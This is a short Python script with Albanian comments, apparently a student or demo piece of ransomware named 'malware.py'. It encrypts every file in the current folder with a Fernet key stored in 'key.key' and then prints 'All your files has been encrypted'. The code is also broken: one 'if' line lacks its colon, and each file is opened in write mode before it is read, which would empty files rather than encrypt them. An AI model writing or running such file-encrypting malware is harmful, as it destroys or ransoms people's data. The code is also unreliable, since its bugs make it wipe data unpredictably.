#!/usr/bin/env python3

#Enkriptimi i fajllave behet duke gjeneruar nje celes i cili ruhet si fajll me emrin qe ja kemi caktuar 'key.key' ne folderin ku gjenden fajllat,
#ku do ta perdorim per dekriptimin e fajllave ne decr.py


#Importimi i modulit os që ofron funksione për krijimin dhe heqjen e nje folderi, marrjen e permbajtjes se tij, ndryshimin dhe identifikimin e folderit aktual, etj.
#Importimi i Fernet nga libraria cryptography.fernet, i cili ofron enkriptim simetrik dhe autentifikim të të dhenave.
import os
from cryptography.fernet import Fernet

#krijimi i variables që permban listen me emrat e fajllave
allfiles = []   
for file in os.listdir():    #Kontrollimi per fajlla në direktoriumin os përmes unazes for
	if file == "malware.py" or file == "key.key" or file == "decr.py":
		 continue               #Fajllat të cilet janë të emeruar si më lart, nuk do të enkriptohen
	if os.path.isfile(file)  
		allfiles.append(file)   #Këto fajlla do të shtohen në listë dhe do të enkriptohen
		
print(allfiles) #Printimi i të gjithë fajllave të cilat janë enkriptuar

key = Fernet.generate_key() #Gjenerimi i celësit me të cilin hap fajllin
with open("key.key", "wb") as thekey: #Hap fajllin ku duhet të shkruhet celësi
	thekey.write(key)  #Shkruan celësin

for file in allfiles:    #Krijimi i unazes For për shikim të fajllave 
	with open(file, "wb") as thefile: #Hapja e fajllave
		content = thefile.read() #Leximi i fajllave
	content_encr = Fernet(key).encrypt(content)  #Enkriptimi i përmbajtjes
	with open(file, "wb") as thefile:  
		thefile.write(content_encr)   #Marrja e përmbajtjes së fajllave dhe ndërrimi me përmbajtjen e enkriptuar

print("All your files has been encrypted")   #Printon:All your files has been encrypted
